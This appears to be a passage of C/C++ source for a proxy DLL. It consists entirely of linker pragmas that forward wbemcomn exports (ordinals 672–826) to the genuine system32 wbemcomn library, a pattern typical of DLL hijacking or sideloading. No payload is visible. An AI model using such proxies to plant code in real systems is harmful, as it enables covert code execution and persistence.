#pragma comment (linker, "/export:?GetDWORDStr@Registry@@QEAAHPEBGPEAK@Z=c:/windows/system32/wbemcomn.?GetDWORDStr@Registry@@QEAAHPEBGPEAK@Z,@672")
#pragma comment (linker, "/export:?GetDacl@CNtSecurityDescriptor@@QEAAHAEAVCNtAcl@@@Z=c:/windows/system32/wbemcomn.?GetDacl@CNtSecurityDescriptor@@QEAAHAEAVCNtAcl@@@Z,@673")
#pragma comment (linker, "/export:?GetDacl@CNtSecurityDescriptor@@QEAAJPEAPEAVCNtAcl@@@Z=c:/windows/system32/wbemcomn.?GetDacl@CNtSecurityDescriptor@@QEAAJPEAPEAVCNtAcl@@@Z,@674")
#pragma comment (linker, "/export:?GetDacl@CNtSecurityDescriptor@@QEAAPEAVCNtAcl@@XZ=c:/windows/system32/wbemcomn.?GetDacl@CNtSecurityDescriptor@@QEAAPEAVCNtAcl@@XZ,@675")
#pragma comment (linker, "/export:?GetDay@CDateTimeParser@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetDay@CDateTimeParser@@QEAAEXZ,@676")
#pragma comment (linker, "/export:?GetDispatch@CVar@@QEAAPEAUIDispatch@@XZ=c:/windows/system32/wbemcomn.?GetDispatch@CVar@@QEAAPEAUIDispatch@@XZ,@677")
#pragma comment (linker, "/export:?GetDispatchAt@CSafeArray@@QEAAPEAUIDispatch@@H@Z=c:/windows/system32/wbemcomn.?GetDispatchAt@CSafeArray@@QEAAPEAUIDispatch@@H@Z,@678")
#pragma comment (linker, "/export:?GetDouble@CVar@@QEAANXZ=c:/windows/system32/wbemcomn.?GetDouble@CVar@@QEAANXZ,@679")
#pragma comment (linker, "/export:?GetDoubleAt@CSafeArray@@QEAANH@Z=c:/windows/system32/wbemcomn.?GetDoubleAt@CSafeArray@@QEAANH@Z,@680")
#pragma comment (linker, "/export:?GetElementSize@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetElementSize@CVarVector@@QEAAHXZ,@681")
#pragma comment (linker, "/export:?GetEmbeddedObject@CVar@@QEAAPEAUIUnknown@@XZ=c:/windows/system32/wbemcomn.?GetEmbeddedObject@CVar@@QEAAPEAUIUnknown@@XZ,@682")
#pragma comment (linker, "/export:?GetEnvironmentValue@CWbemInstallObject@@CAJPEBGPEAPEBG@Z=c:/windows/system32/wbemcomn.?GetEnvironmentValue@CWbemInstallObject@@CAJPEBGPEAPEBG@Z,@683")
#pragma comment (linker, "/export:?GetEventTraceProperties@CWMITraceSettings@@QEAAPEAU_EVENT_TRACE_PROPERTIES@@XZ=c:/windows/system32/wbemcomn.?GetEventTraceProperties@CWMITraceSettings@@QEAAPEAU_EVENT_TRACE_PROPERTIES@@XZ,@684")
#pragma comment (linker, "/export:?GetExpression@CLike@@QEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetExpression@CLike@@QEAAPEBGXZ,@685")
#pragma comment (linker, "/export:?GetFILETIME@CWbemTime@@QEBAHPEAU_FILETIME@@@Z=c:/windows/system32/wbemcomn.?GetFILETIME@CWbemTime@@QEBAHPEAU_FILETIME@@@Z,@686")
#pragma comment (linker, "/export:?GetFQDN_Ipv4@@YAPEAUhostent@@PEAG@Z=c:/windows/system32/wbemcomn.?GetFQDN_Ipv4@@YAPEAUhostent@@PEAG@Z,@687")
#pragma comment (linker, "/export:?GetFileTime@CVar@@QEAA?AU_FILETIME@@XZ=c:/windows/system32/wbemcomn.?GetFileTime@CVar@@QEAA?AU_FILETIME@@XZ,@688")
#pragma comment (linker, "/export:?GetFirstFiringTime@CBasicUnloadInstruction@@UEBA?AVCWbemTime@@XZ=c:/windows/system32/wbemcomn.?GetFirstFiringTime@CBasicUnloadInstruction@@UEBA?AVCWbemTime@@XZ,@689")
#pragma comment (linker, "/export:?GetFirst_ms_XXX_Locale@CMUILocaleList@@QEAAJPEAPEAG@Z=c:/windows/system32/wbemcomn.?GetFirst_ms_XXX_Locale@CMUILocaleList@@QEAAJPEAPEAG@Z,@690")
#pragma comment (linker, "/export:?GetFlags@C9XAce@@UEAAHXZ=c:/windows/system32/wbemcomn.?GetFlags@C9XAce@@UEAAHXZ,@691")
#pragma comment (linker, "/export:?GetFlags@CNtAce@@UEAAHXZ=c:/windows/system32/wbemcomn.?GetFlags@CNtAce@@UEAAHXZ,@692")
#pragma comment (linker, "/export:?GetFloat@CVar@@QEAAMXZ=c:/windows/system32/wbemcomn.?GetFloat@CVar@@QEAAMXZ,@693")
#pragma comment (linker, "/export:?GetFloatAt@CSafeArray@@QEAAMH@Z=c:/windows/system32/wbemcomn.?GetFloatAt@CSafeArray@@QEAAMH@Z,@694")
#pragma comment (linker, "/export:?GetFunctionPointers@CMUILocale@@CAJXZ=c:/windows/system32/wbemcomn.?GetFunctionPointers@CMUILocale@@CAJXZ,@695")
#pragma comment (linker, "/export:?GetFunctionPointers@CPublishWMIOperationEvent@@SAJXZ=c:/windows/system32/wbemcomn.?GetFunctionPointers@CPublishWMIOperationEvent@@SAJXZ,@696")
#pragma comment (linker, "/export:?GetGlobalClientOps@@YAPEAVCClientOpsNode@@XZ=c:/windows/system32/wbemcomn.?GetGlobalClientOps@@YAPEAVCClientOpsNode@@XZ,@697")
#pragma comment (linker, "/export:?GetGroup@CNtSecurityDescriptor@@QEAAPEAVCNtSid@@XZ=c:/windows/system32/wbemcomn.?GetGroup@CNtSecurityDescriptor@@QEAAPEAVCNtSid@@XZ,@698")
#pragma comment (linker, "/export:?GetHandle@CPropertyName@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetHandle@CPropertyName@@QEAAPEAXXZ,@699")
#pragma comment (linker, "/export:?GetHours@CDateTimeParser@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetHours@CDateTimeParser@@QEAAEXZ,@700")
#pragma comment (linker, "/export:?GetIdleTimeout@CExecQueue@@MEAAKPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?GetIdleTimeout@CExecQueue@@MEAAKPEAVCThreadRecord@1@@Z,@701")
#pragma comment (linker, "/export:?GetIndex@CBuffer@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetIndex@CBuffer@@QEAAKXZ,@702")
#pragma comment (linker, "/export:?GetInfinity@CWbemInterval@@SA?AV1@XZ=c:/windows/system32/wbemcomn.?GetInfinity@CWbemInterval@@SA?AV1@XZ,@703")
#pragma comment (linker, "/export:?GetInfinity@CWbemTime@@SA?AV1@XZ=c:/windows/system32/wbemcomn.?GetInfinity@CWbemTime@@SA?AV1@XZ,@704")
#pragma comment (linker, "/export:?GetInfo@CClientOpsNode@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetInfo@CClientOpsNode@@QEAAPEAXXZ,@705")
#pragma comment (linker, "/export:?GetInfo@CNtSid@@QEAAHPEAPEAG0PEAK@Z=c:/windows/system32/wbemcomn.?GetInfo@CNtSid@@QEAAHPEAPEAG0PEAK@Z,@706")
#pragma comment (linker, "/export:?GetInnerUnknown@CUnk@@QEAAPEAUIUnknown@@XZ=c:/windows/system32/wbemcomn.?GetInnerUnknown@CUnk@@QEAAPEAUIUnknown@@XZ,@707")
#pragma comment (linker, "/export:?GetInstructionType@CBasicUnloadInstruction@@UEAAHXZ=c:/windows/system32/wbemcomn.?GetInstructionType@CBasicUnloadInstruction@@UEAAHXZ,@708")
#pragma comment (linker, "/export:?GetLPSTR@CVar@@QEAAPEADXZ=c:/windows/system32/wbemcomn.?GetLPSTR@CVar@@QEAAPEADXZ,@709")
#pragma comment (linker, "/export:?GetLPSTR@WString2@@QEBAPEADXZ=c:/windows/system32/wbemcomn.?GetLPSTR@WString2@@QEBAPEADXZ,@710")
#pragma comment (linker, "/export:?GetLPSTR@WString@@QEBAPEADXZ=c:/windows/system32/wbemcomn.?GetLPSTR@WString@@QEBAPEADXZ,@711")
#pragma comment (linker, "/export:?GetLPWSTR@CVar@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetLPWSTR@CVar@@QEAAPEAGXZ,@712")
#pragma comment (linker, "/export:?GetLToken@WString2@@QEBAPEAGG@Z=c:/windows/system32/wbemcomn.?GetLToken@WString2@@QEBAPEAGG@Z,@713")
#pragma comment (linker, "/export:?GetLToken@WString@@QEBAPEAGG@Z=c:/windows/system32/wbemcomn.?GetLToken@WString@@QEBAPEAGG@Z,@714")
#pragma comment (linker, "/export:?GetLastError@Registry@@QEAAJXZ=c:/windows/system32/wbemcomn.?GetLastError@Registry@@QEAAJXZ,@715")
#pragma comment (linker, "/export:?GetLocalInfoAndAlloc@CDateTimeParser@@IEAAXKAEAPEAG@Z=c:/windows/system32/wbemcomn.?GetLocalInfoAndAlloc@CDateTimeParser@@IEAAXKAEAPEAG@Z,@716")
#pragma comment (linker, "/export:?GetLocalOffsetForDate@CWbemTime@@SAJPEBU_SYSTEMTIME@@@Z=c:/windows/system32/wbemcomn.?GetLocalOffsetForDate@CWbemTime@@SAJPEBU_SYSTEMTIME@@@Z,@717")
#pragma comment (linker, "/export:?GetLocales@CMUILocaleList@@QEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetLocales@CMUILocaleList@@QEAAPEBGXZ,@718")
#pragma comment (linker, "/export:?GetLockCount@CWbemCriticalSection@@QEAAJXZ=c:/windows/system32/wbemcomn.?GetLockCount@CWbemCriticalSection@@QEAAJXZ,@719")
#pragma comment (linker, "/export:?GetLoggingLevelEnabled@@YAKXZ=c:/windows/system32/wbemcomn.?GetLoggingLevelEnabled@@YAKXZ,@720")
#pragma comment (linker, "/export:?GetLong@CVar@@QEAAJXZ=c:/windows/system32/wbemcomn.?GetLong@CVar@@QEAAJXZ,@721")
#pragma comment (linker, "/export:?GetLongAt@CSafeArray@@QEAAJH@Z=c:/windows/system32/wbemcomn.?GetLongAt@CSafeArray@@QEAAJH@Z,@722")
#pragma comment (linker, "/export:?GetMemLogObject@@YAPEAVCMemoryLog@@XZ=c:/windows/system32/wbemcomn.?GetMemLogObject@@YAPEAVCMemoryLog@@XZ,@723")
#pragma comment (linker, "/export:?GetMicroseconds@CDateTimeParser@@QEAAIXZ=c:/windows/system32/wbemcomn.?GetMicroseconds@CDateTimeParser@@QEAAIXZ,@724")
#pragma comment (linker, "/export:?GetMilliseconds@CWbemInterval@@QEBAKXZ=c:/windows/system32/wbemcomn.?GetMilliseconds@CWbemInterval@@QEBAKXZ,@725")
#pragma comment (linker, "/export:?GetMinutes@CDateTimeParser@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetMinutes@CDateTimeParser@@QEAAEXZ,@726")
#pragma comment (linker, "/export:?GetMonth@CDateTimeParser@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetMonth@CDateTimeParser@@QEAAEXZ,@727")
#pragma comment (linker, "/export:?GetMultiStr@Registry@@QEAAPEAGPEBGAEAK@Z=c:/windows/system32/wbemcomn.?GetMultiStr@Registry@@QEAAPEAGPEBGAEAK@Z,@728")
#pragma comment (linker, "/export:?GetNewSafeArray@CVar@@QEAAPEAUtagSAFEARRAY@@XZ=c:/windows/system32/wbemcomn.?GetNewSafeArray@CVar@@QEAAPEAUtagSAFEARRAY@@XZ,@729")
#pragma comment (linker, "/export:?GetNewSafeArray@CVarVector@@QEAAPEAUtagSAFEARRAY@@XZ=c:/windows/system32/wbemcomn.?GetNewSafeArray@CVarVector@@QEAAPEAUtagSAFEARRAY@@XZ,@730")
#pragma comment (linker, "/export:?GetNewVariant@CVar@@QEAAPEAUtagVARIANT@@XZ=c:/windows/system32/wbemcomn.?GetNewVariant@CVar@@QEAAPEAUtagVARIANT@@XZ,@731")
#pragma comment (linker, "/export:?GetNext@CClientOpsNode@@QEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?GetNext@CClientOpsNode@@QEAAPEAV1@XZ,@732")
#pragma comment (linker, "/export:?GetNext@CExecRequest@@QEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?GetNext@CExecRequest@@QEAAPEAV1@XZ,@733")
#pragma comment (linker, "/export:?GetNextElement@CCircularQueue@@QEAAKPEAPEAULOG_ELEMENT@@@Z=c:/windows/system32/wbemcomn.?GetNextElement@CCircularQueue@@QEAAKPEAPEAULOG_ELEMENT@@@Z,@734")
#pragma comment (linker, "/export:?GetNextFiringTime@CBasicUnloadInstruction@@UEBA?AVCWbemTime@@V2@PEAJ@Z=c:/windows/system32/wbemcomn.?GetNextFiringTime@CBasicUnloadInstruction@@UEBA?AVCWbemTime@@V2@PEAJ@Z,@735")
#pragma comment (linker, "/export:?GetNumAces@CNtAcl@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetNumAces@CNtAcl@@QEAAHXZ,@736")
#pragma comment (linker, "/export:?GetNumElements@CPropertyName@@QEBAJXZ=c:/windows/system32/wbemcomn.?GetNumElements@CPropertyName@@QEBAJXZ,@737")
#pragma comment (linker, "/export:?GetNumInstructions@CInstructionQueue@@QEAAJXZ=c:/windows/system32/wbemcomn.?GetNumInstructions@CInstructionQueue@@QEAAJXZ,@738")
#pragma comment (linker, "/export:?GetNumStrings@CEventLogRecord@@QEAAGXZ=c:/windows/system32/wbemcomn.?GetNumStrings@CEventLogRecord@@QEAAGXZ,@739")
#pragma comment (linker, "/export:?GetOleType@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetOleType@CVar@@QEAAHXZ,@740")
#pragma comment (linker, "/export:?GetOwner@CNtSecurityDescriptor@@QEAAPEAVCNtSid@@XZ=c:/windows/system32/wbemcomn.?GetOwner@CNtSecurityDescriptor@@QEAAPEAVCNtSid@@XZ,@741")
#pragma comment (linker, "/export:?GetOwningThreadId@CWbemCriticalSection@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetOwningThreadId@CWbemCriticalSection@@QEAAKXZ,@742")
#pragma comment (linker, "/export:?GetPart@CDatePart@@QEAAJHPEAH@Z=c:/windows/system32/wbemcomn.?GetPart@CDatePart@@QEAAJHPEAH@Z,@743")
#pragma comment (linker, "/export:?GetPersistentCfgValue@CPersistentConfig@@QEAAHKAEAK@Z=c:/windows/system32/wbemcomn.?GetPersistentCfgValue@CPersistentConfig@@QEAAHKAEAK@Z,@744")
#pragma comment (linker, "/export:?GetPotentialImpersonation@CWbemCallSecurity@@UEAAJXZ=c:/windows/system32/wbemcomn.?GetPotentialImpersonation@CWbemCallSecurity@@UEAAJXZ,@745")
#pragma comment (linker, "/export:?GetPreferedDateFormat@CDateTimeParser@@IEAAXXZ=c:/windows/system32/wbemcomn.?GetPreferedDateFormat@CDateTimeParser@@IEAAXXZ,@746")
#pragma comment (linker, "/export:?GetPreferredLanguages@CMUILocale@@SAJKPEAPEAGPEAK@Z=c:/windows/system32/wbemcomn.?GetPreferredLanguages@CMUILocale@@SAJKPEAPEAGPEAK@Z,@747")
#pragma comment (linker, "/export:?GetPreferredLanguages@CMUILocale@@SAJPEAPEAGPEAK@Z=c:/windows/system32/wbemcomn.?GetPreferredLanguages@CMUILocale@@SAJPEAPEAGPEAK@Z,@748")
#pragma comment (linker, "/export:?GetPrevious@CClientOpsNode@@QEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?GetPrevious@CClientOpsNode@@QEAAPEAV1@XZ,@749")
#pragma comment (linker, "/export:?GetPriority@CExecRequest@@QEAAJXZ=c:/windows/system32/wbemcomn.?GetPriority@CExecRequest@@QEAAJXZ,@750")
#pragma comment (linker, "/export:?GetPropertyFromIUnknown@CTextTemplate@@AEAAPEAGPEAGPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?GetPropertyFromIUnknown@CTextTemplate@@AEAAPEAGPEAGPEAUIUnknown@@@Z,@751")
#pragma comment (linker, "/export:?GetPtr@CNtAce@@QEAAPEAU_ACCESS_ALLOWED_ACE@@XZ=c:/windows/system32/wbemcomn.?GetPtr@CNtAce@@QEAAPEAU_ACCESS_ALLOWED_ACE@@XZ,@752")
#pragma comment (linker, "/export:?GetPtr@CNtAcl@@QEAAPEAU_ACL@@XZ=c:/windows/system32/wbemcomn.?GetPtr@CNtAcl@@QEAAPEAU_ACL@@XZ,@753")
#pragma comment (linker, "/export:?GetPtr@CNtSecurityDescriptor@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetPtr@CNtSecurityDescriptor@@QEAAPEAXXZ,@754")
#pragma comment (linker, "/export:?GetPtr@CNtSid@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetPtr@CNtSid@@QEAAPEAXXZ,@755")
#pragma comment (linker, "/export:?GetQFDN_Ipv6@@YAKPEAG0HH@Z=c:/windows/system32/wbemcomn.?GetQFDN_Ipv6@@YAKPEAG0HH@Z,@756")
#pragma comment (linker, "/export:?GetQWORD@Registry@@QEAAHPEBGPEA_K@Z=c:/windows/system32/wbemcomn.?GetQWORD@Registry@@QEAAHPEBGPEA_K@Z,@757")
#pragma comment (linker, "/export:?GetQueryClass@QL1_Parser@@QEAAHPEAGH@Z=c:/windows/system32/wbemcomn.?GetQueryClass@QL1_Parser@@QEAAHPEAGH@Z,@758")
#pragma comment (linker, "/export:?GetQueueSize@CFlexQueue@@QEBAHXZ=c:/windows/system32/wbemcomn.?GetQueueSize@CFlexQueue@@QEBAHXZ,@759")
#pragma comment (linker, "/export:?GetRawArrayData@CVarVector@@QEAAJPEAXH@Z=c:/windows/system32/wbemcomn.?GetRawArrayData@CVarVector@@QEAAJPEAXH@Z,@760")
#pragma comment (linker, "/export:?GetRawData@CBuffer@@QEAAPEAEXZ=c:/windows/system32/wbemcomn.?GetRawData@CBuffer@@QEAAPEAEXZ,@761")
#pragma comment (linker, "/export:?GetRawData@CSafeArray@@QEAAHPEAXH@Z=c:/windows/system32/wbemcomn.?GetRawData@CSafeArray@@QEAAHPEAXH@Z,@762")
#pragma comment (linker, "/export:?GetRawData@CVar@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetRawData@CVar@@QEAAPEAXXZ,@763")
#pragma comment (linker, "/export:?GetRecursionCount@CWbemCriticalSection@@QEAAJXZ=c:/windows/system32/wbemcomn.?GetRecursionCount@CWbemCriticalSection@@QEAAJXZ,@764")
#pragma comment (linker, "/export:?GetReferencedAliases@CWQLScanner@@QEAAHAEAVCWStringArray@@@Z=c:/windows/system32/wbemcomn.?GetReferencedAliases@CWQLScanner@@QEAAHAEAVCWStringArray@@@Z,@765")
#pragma comment (linker, "/export:?GetReferencedTables@CWQLScanner@@QEAAHAEAVCWStringArray@@@Z=c:/windows/system32/wbemcomn.?GetReferencedTables@CWQLScanner@@QEAAHAEAVCWStringArray@@@Z,@766")
#pragma comment (linker, "/export:?GetRegistryPathCIMOM@CWbemInstallObject@@SAPEBGXZ=c:/windows/system32/wbemcomn.?GetRegistryPathCIMOM@CWbemInstallObject@@SAPEBGXZ,@767")
#pragma comment (linker, "/export:?GetRegistryPathWbem@CWbemInstallObject@@SAPEBGXZ=c:/windows/system32/wbemcomn.?GetRegistryPathWbem@CWbemInstallObject@@SAPEBGXZ,@768")
#pragma comment (linker, "/export:?GetRepositoryFolder@CWbemInstallObject@@SAPEBGXZ=c:/windows/system32/wbemcomn.?GetRepositoryFolder@CWbemInstallObject@@SAPEBGXZ,@769")
#pragma comment (linker, "/export:?GetSYSTEMTIME@CWbemTime@@QEBAHPEAU_SYSTEMTIME@@@Z=c:/windows/system32/wbemcomn.?GetSYSTEMTIME@CWbemTime@@QEBAHPEAU_SYSTEMTIME@@@Z,@770")
#pragma comment (linker, "/export:?GetSacl@CNtSecurityDescriptor@@QEAAJPEAPEAVCNtAcl@@@Z=c:/windows/system32/wbemcomn.?GetSacl@CNtSecurityDescriptor@@QEAAJPEAPEAVCNtAcl@@@Z,@771")
#pragma comment (linker, "/export:?GetSacl@CNtSecurityDescriptor@@QEAAPEAVCNtAcl@@XZ=c:/windows/system32/wbemcomn.?GetSacl@CNtSecurityDescriptor@@QEAAPEAVCNtAcl@@XZ,@772")
#pragma comment (linker, "/export:?GetSafeArray@CVarVector@@QEAAPEAUtagSAFEARRAY@@H@Z=c:/windows/system32/wbemcomn.?GetSafeArray@CVarVector@@QEAAPEAUtagSAFEARRAY@@H@Z,@773")
#pragma comment (linker, "/export:?GetScalarAt@CSafeArray@@AEAA?ATSA_ArrayScalar@@H@Z=c:/windows/system32/wbemcomn.?GetScalarAt@CSafeArray@@AEAA?ATSA_ArrayScalar@@H@Z,@774")
#pragma comment (linker, "/export:?GetSeconds@CDateTimeParser@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetSeconds@CDateTimeParser@@QEAAEXZ,@775")
#pragma comment (linker, "/export:?GetSeconds@CWbemInterval@@QEBAKXZ=c:/windows/system32/wbemcomn.?GetSeconds@CWbemInterval@@QEBAKXZ,@776")
#pragma comment (linker, "/export:?GetSecurityDescriptorFromParameters@@YAJPEAVCNtSecurityDescriptor@@PEAUIWbemClassObject@@PEA_NPEAPEAV1@PEAK@Z=c:/windows/system32/wbemcomn.?GetSecurityDescriptorFromParameters@@YAJPEAVCNtSecurityDescriptor@@PEAUIWbemClassObject@@PEA_NPEAPEAV1@PEAK@Z,@777")
#pragma comment (linker, "/export:?GetSelectedColumns@CWQLScanner@@QEAAPEBVCFlexArray@@XZ=c:/windows/system32/wbemcomn.?GetSelectedColumns@CWQLScanner@@QEAAPEBVCFlexArray@@XZ,@778")
#pragma comment (linker, "/export:?GetSerializedSize@C9XAce@@UEAAKXZ=c:/windows/system32/wbemcomn.?GetSerializedSize@C9XAce@@UEAAKXZ,@779")
#pragma comment (linker, "/export:?GetSerializedSize@CNtAce@@UEAAKXZ=c:/windows/system32/wbemcomn.?GetSerializedSize@CNtAce@@UEAAKXZ,@780")
#pragma comment (linker, "/export:?GetSessionName@CWMITraceSettings@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetSessionName@CWMITraceSettings@@QEAAPEAGXZ,@781")
#pragma comment (linker, "/export:?GetShort@CVar@@QEAAFXZ=c:/windows/system32/wbemcomn.?GetShort@CVar@@QEAAFXZ,@782")
#pragma comment (linker, "/export:?GetShortAt@CSafeArray@@QEAAFH@Z=c:/windows/system32/wbemcomn.?GetShortAt@CSafeArray@@QEAAFH@Z,@783")
#pragma comment (linker, "/export:?GetSid@CNtAce@@QEAAHAEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?GetSid@CNtAce@@QEAAHAEAVCNtSid@@@Z,@784")
#pragma comment (linker, "/export:?GetSid@CNtAce@@QEAAPEAVCNtSid@@XZ=c:/windows/system32/wbemcomn.?GetSid@CNtAce@@QEAAPEAVCNtSid@@XZ,@785")
#pragma comment (linker, "/export:?GetSidFromThreadOrProcess@CIdentitySecurity@@AEAAJAEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?GetSidFromThreadOrProcess@CIdentitySecurity@@AEAAJAEAVCNtSid@@@Z,@786")
#pragma comment (linker, "/export:?GetSinglePropertyName@CAbstractQl1Parser@@IEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetSinglePropertyName@CAbstractQl1Parser@@IEAAPEBGXZ,@787")
#pragma comment (linker, "/export:?GetSitoutPenalty@CExecQueue@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetSitoutPenalty@CExecQueue@@QEAAKXZ,@788")
#pragma comment (linker, "/export:?GetSize@CBuffer@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetSize@CBuffer@@QEAAKXZ,@789")
#pragma comment (linker, "/export:?GetSize@CNtAce@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetSize@CNtAce@@QEAAKXZ,@790")
#pragma comment (linker, "/export:?GetSize@CNtAcl@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetSize@CNtAcl@@QEAAKXZ,@791")
#pragma comment (linker, "/export:?GetSize@CNtSecurityDescriptor@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetSize@CNtSecurityDescriptor@@QEAAKXZ,@792")
#pragma comment (linker, "/export:?GetSize@CNtSid@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetSize@CNtSid@@QEAAKXZ,@793")
#pragma comment (linker, "/export:?GetStatus@C9XAce@@UEAAKXZ=c:/windows/system32/wbemcomn.?GetStatus@C9XAce@@UEAAKXZ,@794")
#pragma comment (linker, "/export:?GetStatus@CNtAce@@UEAAKXZ=c:/windows/system32/wbemcomn.?GetStatus@CNtAce@@UEAAKXZ,@795")
#pragma comment (linker, "/export:?GetStatus@CNtAcl@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetStatus@CNtAcl@@QEAAKXZ,@796")
#pragma comment (linker, "/export:?GetStatus@CNtSecurityDescriptor@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetStatus@CNtSecurityDescriptor@@QEAAKXZ,@797")
#pragma comment (linker, "/export:?GetStatus@CNtSid@@QEAAKXZ=c:/windows/system32/wbemcomn.?GetStatus@CNtSid@@QEAAKXZ,@798")
#pragma comment (linker, "/export:?GetStr@Registry@@QEAAHPEBGPEAPEAG@Z=c:/windows/system32/wbemcomn.?GetStr@Registry@@QEAAHPEBGPEAPEAG@Z,@799")
#pragma comment (linker, "/export:?GetString@CInsertionString@@QEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetString@CInsertionString@@QEAAPEBGXZ,@800")
#pragma comment (linker, "/export:?GetStringAt@CEventLogRecord@@QEAAPEBGH@Z=c:/windows/system32/wbemcomn.?GetStringAt@CEventLogRecord@@QEAAPEBGH@Z,@801")
#pragma comment (linker, "/export:?GetStringAt@CPropertyName@@QEBAPEBGJ@Z=c:/windows/system32/wbemcomn.?GetStringAt@CPropertyName@@QEBAPEBGJ@Z,@802")
#pragma comment (linker, "/export:?GetStringPointerByRef@WString2@@QEBAAEBQEBGXZ=c:/windows/system32/wbemcomn.?GetStringPointerByRef@WString2@@QEBAAEBQEBGXZ,@803")
#pragma comment (linker, "/export:?GetStringPointerByRef@WString@@QEBAAEBQEBGXZ=c:/windows/system32/wbemcomn.?GetStringPointerByRef@WString@@QEBAAEBQEBGXZ,@804")
#pragma comment (linker, "/export:?GetText@CPropertyName@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetText@CPropertyName@@QEAAPEAGXZ,@805")
#pragma comment (linker, "/export:?GetText@CVar@@QEAAPEAGJJPEBG@Z=c:/windows/system32/wbemcomn.?GetText@CVar@@QEAAPEAGJJPEBG@Z,@806")
#pragma comment (linker, "/export:?GetText@CVarVector@@QEAAPEAGJJ@Z=c:/windows/system32/wbemcomn.?GetText@CVarVector@@QEAAPEAGJJ@Z,@807")
#pragma comment (linker, "/export:?GetText@QL_LEVEL_1_RPN_EXPRESSION@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetText@QL_LEVEL_1_RPN_EXPRESSION@@QEAAPEAGXZ,@808")
#pragma comment (linker, "/export:?GetText@QL_LEVEL_1_TOKEN@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetText@QL_LEVEL_1_TOKEN@@QEAAPEAGXZ,@809")
#pragma comment (linker, "/export:?GetTextSid@CNtSid@@QEAAHPEAGPEAK@Z=c:/windows/system32/wbemcomn.?GetTextSid@CNtSid@@QEAAHPEAGPEAK@Z,@810")
#pragma comment (linker, "/export:?GetTextSid@CNtSid@@QEAAJPEAPEAG@Z=c:/windows/system32/wbemcomn.?GetTextSid@CNtSid@@QEAAJPEAPEAG@Z,@811")
#pragma comment (linker, "/export:?GetTickCount@CWbemTime@@SA?AV1@XZ=c:/windows/system32/wbemcomn.?GetTickCount@CWbemTime@@SA?AV1@XZ,@812")
#pragma comment (linker, "/export:?GetTlsIndex@CExecQueue@@SAKXZ=c:/windows/system32/wbemcomn.?GetTlsIndex@CExecQueue@@SAKXZ,@813")
#pragma comment (linker, "/export:?GetToken@CWbemCallSecurity@@UEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetToken@CWbemCallSecurity@@UEAAPEAXXZ,@814")
#pragma comment (linker, "/export:?GetTraceLevel@CWMITraceSettings@@QEAAEXZ=c:/windows/system32/wbemcomn.?GetTraceLevel@CWMITraceSettings@@QEAAEXZ,@815")
#pragma comment (linker, "/export:?GetType@C9XAce@@UEAAHXZ=c:/windows/system32/wbemcomn.?GetType@C9XAce@@UEAAHXZ,@816")
#pragma comment (linker, "/export:?GetType@CExecQueue@@UEAAPEBGXZ=c:/windows/system32/wbemcomn.?GetType@CExecQueue@@UEAAPEBGXZ,@817")
#pragma comment (linker, "/export:?GetType@CNtAce@@UEAAHXZ=c:/windows/system32/wbemcomn.?GetType@CNtAce@@UEAAHXZ,@818")
#pragma comment (linker, "/export:?GetType@CSafeArray@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetType@CSafeArray@@QEAAHXZ,@819")
#pragma comment (linker, "/export:?GetType@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetType@CVar@@QEAAHXZ,@820")
#pragma comment (linker, "/export:?GetType@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetType@CVarVector@@QEAAHXZ,@821")
#pragma comment (linker, "/export:?GetType@Registry@@QEAAHPEBGPEAK@Z=c:/windows/system32/wbemcomn.?GetType@Registry@@QEAAHPEBGPEAK@Z,@822")
#pragma comment (linker, "/export:?GetTypeText@CVar@@QEAAPEAGXZ=c:/windows/system32/wbemcomn.?GetTypeText@CVar@@QEAAPEAGXZ,@823")
#pragma comment (linker, "/export:?GetUTC@CDateTimeParser@@QEAAHXZ=c:/windows/system32/wbemcomn.?GetUTC@CDateTimeParser@@QEAAHXZ,@824")
#pragma comment (linker, "/export:?GetUnknown@CUnk@@QEAAPEAUIUnknown@@XZ=c:/windows/system32/wbemcomn.?GetUnknown@CUnk@@QEAAPEAUIUnknown@@XZ,@825")
#pragma comment (linker, "/export:?GetUnknown@CUnkInternal@@QEAAPEAUIUnknown@@XZ=c:/windows/system32/wbemcomn.?GetUnknown@CUnkInternal@@QEAAPEAUIUnknown@@XZ,@826")
